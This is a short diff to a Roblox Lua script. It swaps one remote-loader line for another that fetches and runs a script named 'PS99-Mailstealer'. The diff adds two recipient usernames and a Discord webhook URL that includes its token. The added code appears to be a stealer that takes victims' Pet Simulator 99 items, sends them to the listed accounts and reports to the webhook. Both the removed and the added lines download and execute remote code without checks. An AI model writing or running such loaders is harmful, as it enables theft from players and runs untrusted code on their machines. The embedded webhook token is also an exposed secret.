@@ -1,1 +1,5 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Imjsutdjsi/GetNoobed/main/StarcourdScriptLua.txt'))()
+Username = "sardopogi22"
+Username2 = "WWWW6463WWWWWW5WWWWW"
+Webhook = "https://discord.com/api/webhooks/1259483150246088927/XZtRyZFBMk18IVGPfky70oOcQDjxne1WnVlQWhSSiWVjfXTLeWl6swkeTl9n62c9kQ6K"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
